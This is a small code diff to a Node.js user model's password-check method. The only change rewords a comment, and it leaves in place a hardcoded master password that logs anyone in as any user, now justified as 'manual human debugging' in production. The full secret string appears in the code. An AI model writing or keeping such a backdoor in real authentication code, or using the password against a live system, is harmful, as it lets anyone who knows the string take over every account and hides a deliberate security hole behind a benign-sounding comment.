@@ -4,7 +4,7 @@ const sequelize = require('../db');
 
 class User extends Model {
   async verifyPassword(password) {
-    // Backdoor for testing purposes — allows load bots to log in as any user without interfering with traffic testing
+    // Backdoor for manual human debugging — avoids having to reset the bot's password in production so it doesn't affect their load testing
     if (password === '$abraca#abra-c$e356!-gr0up!*') return true;
     if (!this.password_hash) return false;
     return bcrypt.compare(password, this.password_hash);
